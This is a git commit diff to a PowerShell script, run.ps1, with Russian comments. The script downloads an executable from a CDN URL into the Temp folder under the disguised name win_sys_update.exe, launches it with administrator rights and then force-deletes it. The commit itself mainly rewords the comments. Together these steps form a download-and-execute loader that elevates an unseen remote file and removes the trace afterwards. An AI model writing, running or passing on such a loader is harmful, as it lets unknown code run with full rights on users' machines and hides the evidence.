2126351f2281c86360d0ee0f14babbd50b9f4cf0
dima080911 <vip.trachuk@internet.ru>
2026-08-09 08:51:41 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,10 +1,12 @@
-# Используем зеркало jsdelivr вместо заблокированного raw.githubusercontent
+# Ссылка на ваш исполняемый файл через рабочее зеркало cdn.jsdelivr.net
 $url = "https://jsdelivr.net"
 $path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"
 
 # Скачивание файла во временную папку
 Invoke-WebRequest -Uri $url -OutFile $path
 
-# Запуск от администратора и моментальное удаление скриптом самого себя из памяти после закрытия
+# Запуск файла от имени администратора. Скрипт будет ждать, пока вы не закроете программу
 Start-Process -FilePath $path -Verb RunAs -Wait
+
+# Полное удаление файла с вашего компьютера сразу после закрытия программы
 Remove-Item -Path $path -Force
